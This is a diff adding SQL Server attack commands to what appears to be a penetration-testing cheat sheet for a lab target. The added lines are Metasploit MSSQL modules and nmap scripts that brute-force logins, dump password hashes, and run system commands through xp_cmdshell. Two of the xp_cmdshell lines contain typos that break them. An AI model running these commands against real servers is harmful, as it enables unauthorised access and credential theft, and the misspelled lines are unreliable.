@@ -266,6 +266,15 @@ use auxiliary/scanner/mysql/mysql_hashdump
 ```
 use auxiliary/scanner/mysql/mysql_login
 ```
+```
+use auxiliary/admin/mssql/mssql_enum_sql_login
+```
+```
+use auxiliary/admin/mssql/mssql_exec
+```
+```
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+```
 Nmap:
 ```
 nmap 10.10.20.3 -sV -p 3306 --script=mysql-empty-passwords
@@ -281,6 +290,30 @@ nmap 10.10.20.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='
 ```
 ```
 nmap 10.10.20.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-info
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-empty-password
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-xp--cmdshell --scipt-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
+```
+```
+nmap 10.10.20.3 -p 1433 --script ms-sql-xp--cmdshell --scipt-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
 ```
 Hydra:
 ```
